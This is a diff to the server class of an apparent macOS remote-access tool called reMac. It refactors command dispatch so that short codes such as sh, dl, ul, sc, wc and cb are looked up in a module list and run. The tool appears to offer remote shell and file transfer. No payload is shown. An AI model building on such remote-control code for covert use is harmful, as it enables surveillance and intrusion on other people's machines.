@@ -62,66 +62,84 @@ class reMac_libserver(reMac_libbase):
                 if sent and not self._send_buffer:
                     self.close()
 
+    def getModule4Cmd(self, cmd):
+        for mod in reMacModules:
+            # print(f'{mod.cmd_short}, {mod.cmd_long}, {mod.cmd_desc}')
+            if mod.cmd_short == cmd or mod.cmd_long == cmd:
+                return mod
+        return None
+
     def processInput(self, input, value = ""):
 
-        for mod in reMacModules:
-            print(f'{mod.cmd_short}, {mod.cmd_long}, {mod.cmd_desc}')
+        # for mod in reMacModules:
+        #     print(f'{mod.cmd_short}, {mod.cmd_long}, {mod.cmd_desc}')
 
         if input == "q":
             sys.exit(1)
-        elif input == "h":
-            # print_help()
-            pass
-        elif input == "hw" \
-                or input == "ch" \
-                or input == "vd" \
-                or input == "cl" \
-                or input == "wc" \
-                or input == "hp" \
-                or input == "d":
-            for mod in reMacModules:
-                if mod.cmd_short == input:
-                    return mod.run_mod()
-        elif input == "dl" \
-                or input == "ul" \
-                or input == "in" \
-                or input == "cb" \
-                or input == "rm" \
-                or input == "sc":
-            for mod in reMacModules:
-                if mod.cmd_short == input:
-                    return mod.run_mod(input, value)
-        elif input == "sh":
-            for mod in reMacModules:
-                if mod.cmd_short == input:
-                    if mod.running == True:
-                        mod.command = value
-                        break
-                    else:
-                        return mod.run_cmd(input, value)
-        elif input.startswith("mh"):
+
+        if input.startswith("mh"):
             for mod in reMacModules:
                 if mod.cmd_short == input:
                     return mod.print_client_help("reMac", reMacModules, value)
         else:
-            print(f"Command '{input}' NOT FOUND! Check the following command list")
+            mod = self.getModule4Cmd(input)
+            if mod is not None:
+                return mod.run_mod(input, value)
+        # elif input == "h":
+        #     # print_help()
+        #     pass
+        # elif input == "hw" \
+        #         or input == "ch" \
+        #         or input == "vd" \
+        #         or input == "cl" \
+        #         or input == "wc" \
+        #         or input == "hp":
+        #     for mod in reMacModules:
+        #         if mod.cmd_short == input:
+        #             return mod.run_mod()
+        # elif input == "dl" \
+        #         or input == "ul" \
+        #         or input == "in" \
+        #         or input == "cb" \
+        #         or input == "rm" \
+        #         or input == "sc":
+        #     for mod in reMacModules:
+        #         if mod.cmd_short == input:
+        #             return mod.run_mod(input, value)
+        # elif input == "sh":
+        #     for mod in reMacModules:
+        #         if mod.cmd_short == input:
+        #             if mod.running == True:
+        #                 mod.command = value
+        #                 break
+        #             else:
+        #                 return mod.run_cmd(input, value)
+        # elif input.startswith("mh"):
+        #     for mod in reMacModules:
+        #         if mod.cmd_short == input:
+        #             return mod.print_client_help("reMac", reMacModules, value)
+        # else:
+        print(f"Command '{input}' NOT FOUND! Check the following command list")
 
     def _create_response_json_content(self):
         action = self.request.get("action")
         value = self.request.get("value")
-        if action == "hw" \
-                or action == "cb" \
-                or action == "vd" \
-                or action == "ch" \
-                or action == "cl" \
-                or action == "sh" \
-                or action == "sc" \
-                or action == "wc" \
-                or action == "rm" \
-                or action == "in" \
-                or action == "dl" \
-                or action == "hp" \
-                or action.startswith("mh"):
+
+        mod = self.getModule4Cmd(action)
+        if mod is not None:
+        # if action == "hw" \
+        #         or action == "cb" \
+        #         or action == "vd" \
+        #         or action == "ch" \
+        #         or action == "cl" \
+        #         or action == "sh" \
+        #         or action == "sc" \
+        #         or action == "wc" \
+        #         or action == "rm" \
+        #         or action == "in" \
+        #         or action == "dl" \
+        #         or action == "hp" \
+        #         or action.startswith("mh"):
             answer = self.processInput(action, value)
             if action == "dl":
                 filename = value.split("/")
